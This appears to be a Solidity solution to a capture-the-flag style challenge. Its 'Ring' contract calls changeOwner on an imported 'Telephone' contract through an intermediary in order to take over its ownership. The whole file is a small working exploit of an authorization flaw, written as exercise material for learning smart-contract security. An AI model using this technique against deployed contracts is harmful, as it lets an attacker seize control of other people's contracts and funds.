// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract Ring {

    address public self;
    Telephone public target;

    constructor(address tgt, address _self) {
      self = _self;
      target = Telephone(tgt);
    }

    function ring() public {
      target.changeOwner(self);
    }
}